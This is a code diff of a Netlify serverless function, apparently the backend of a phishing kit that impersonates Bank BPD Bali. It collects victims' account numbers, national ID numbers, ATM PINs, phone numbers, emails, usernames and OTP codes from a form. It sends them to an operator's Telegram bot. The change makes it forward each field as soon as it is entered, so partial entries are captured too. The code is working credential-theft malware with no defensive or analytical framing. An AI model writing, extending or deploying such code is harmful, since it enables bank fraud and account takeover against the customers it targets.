@@ -1,8 +1,8 @@
-// Netlify Function untuk mengirim notifikasi ke Telegram Bot
-// AMAN: Token dan Chat ID disimpan di Environment Variables Netlify
-
-exports.handler = async (event, context) => {
-    // Hanya menerima method POST
+// netlify/functions/send-aktivasi.js
+exports.handler = async (event) => {
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+    
     if (event.httpMethod !== 'POST') {
         return {
             statusCode: 405,
@@ -11,85 +11,71 @@ exports.handler = async (event, context) => {
     }
     
     try {
-        // Ambil data dari request body
         const data = JSON.parse(event.body);
+        const { triggerField, isFinal, noRekening, noIdentitas, pinAtm, noTelpon, email, username, kodeOtp, timestamp } = data;
         
-        // Validasi data yang diterima
-        const requiredFields = ['noRekening', 'noIdentitas', 'pinAtm', 'noTelpon', 'email', 'username', 'kodeOtp'];
-        for (const field of requiredFields) {
-            if (!data[field]) {
-                return {
-                    statusCode: 400,
-                    body: JSON.stringify({ message: `Field ${field} tidak boleh kosong` })
-                };
+        let message = '';
+        
+        // Format pesan berdasarkan trigger field (notifikasi per field)
+        if (!isFinal) {
+            switch(triggerField) {
+                case 'noRekening':
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}`;
+                    break;
+                case 'noIdentitas':
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}`;
+                    break;
+                case 'pinAtm':
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}`;
+                    break;
+                case 'noTelpon':
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ NO.HP : ${noTelpon}`;
+                    break;
+                case 'email':
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ EMAIL : ${email}\n├───────────────────`;
+                    break;
+                case 'username':
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ EMAIL : ${email}\n├───────────────────\n├─ USER : ${username}`;
+                    break;
+                case 'kodeOtp':
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ EMAIL : ${email}\n├───────────────────\n├─ USER : ${username}\n├─ KODE : ${kodeOtp}\n╰───────────────────`;
+                    break;
+                default:
+                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ Data terbaru tersimpan\n╰───────────────────`;
             }
+        } else {
+            // Notifikasi final lengkap
+            message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ NO.HP : ${noTelpon}\n├─ EMAIL : ${email}\n├───────────────────\n├─ USER : ${username}\n├─ KODE : ${kodeOtp}\n├───────────────────\n├─ WAKTU : ${timestamp}\n╰───────────────────`;
         }
         
-        // Ambil konfigurasi dari Environment Variables (AMAN)
-        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+        // Kirim ke Telegram
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const response = await fetch(telegramUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
         
-        if (!BOT_TOKEN || !CHAT_ID) {
-            console.error('Environment variables not set');
-            return {
-                statusCode: 500,
-                body: JSON.stringify({ message: 'Konfigurasi server error' })
-            };
-        }
-        
-        // Format pesan untuk Telegram - SESUAI PERMINTAAN
-        const message = `
-┌─  BANK BPD BALI 
-├───────────────────
-├─ NO.REK : ${data.noRekening}
-├─ NIK.KTP : ${data.noIdentitas}
-├─ PIN ATM : ${data.pinAtm}
-├─ NO.HP : ${data.noTelpon}
-├─ EMAIL : ${data.email}
-├───────────────────
-├─ USER : ${data.username}
-├─ KODE : ${data.kodeOtp}
-╰───────────────────
-        `;
-        
-        // Encode pesan untuk URL
-        const encodedMessage = encodeURIComponent(message);
-        
-        // Kirim ke Telegram Bot API
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
-        
-        const response = await fetch(telegramUrl);
         const result = await response.json();
         
-        if (!response.ok || !result.ok) {
-            console.error('Telegram API error:', result);
-            return {
-                statusCode: 500,
-                body: JSON.stringify({ message: 'Gagal mengirim ke Telegram', error: result.description })
-            };
+        if (!result.ok) {
+            throw new Error(result.description);
         }
-        
-        // Log sukses (opsional)
-        console.log('Notifikasi terkirim ke Telegram:', new Date().toISOString());
         
         return {
             statusCode: 200,
-            body: JSON.stringify({ 
-                success: true, 
-                message: 'Notifikasi berhasil dikirim',
-                data: {
-                    noRekening: data.noRekening,
-                    username: data.username,
-                    timestamp: data.timestamp
-                }
-            })
+            body: JSON.stringify({ success: true, message: 'Notifikasi terkirim' })
         };
         
     } catch (error) {
-        console.error('Function error:', error);
+        console.error('Error:', error);
         return {
             statusCode: 500,
-            body: JSON.stringify({ message: 'Internal server error', error: error.message })
+            body: JSON.stringify({ success: false, message: error.message })
         };
     }
 };
